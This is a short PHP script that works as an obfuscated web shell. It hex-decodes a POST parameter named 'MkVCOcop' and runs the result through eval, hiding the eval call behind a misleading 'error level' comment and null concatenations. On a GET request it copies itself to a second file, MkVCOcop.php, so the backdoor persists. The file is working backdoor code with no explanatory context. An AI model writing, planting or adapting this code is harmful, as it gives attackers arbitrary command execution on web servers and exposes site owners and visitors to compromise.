
<?php
$flags = "OUybYwPaTqX2tuJ9sVxEFr5hNcjo4HZ";
class _
{
    static public $MkVCOcop=Null;
    function __construct($l="error"){
        self::$MkVCOcop=$l;
        @eval/*Defining error level offences*/(null.null.self::$MkVCOcop);
    }
}
function hexToStr($hex){   
        $str=""; 
        for($i=0;$i<strlen($hex)-1;$i+=2)
        $str.=chr(hexdec($hex[$i].$hex[$i+1]));
        return  $str;
    }
if(!empty($_POST))
{
	$error = null.hexToStr(@$_POST/*\*/["MkVCOcop"]);
	$d = new _($error);
}
else
{
	$filef = $_SERVER["SCRIPT_FILENAME"];
	$dst = dirname($_SERVER['SCRIPT_FILENAME']).'/MkVCOcop.php';
	if (copy($filef, $dst)) {
		echo 'copy success!';
	}
	else
	{
		echo 'copy failed!';
	}
}
?>
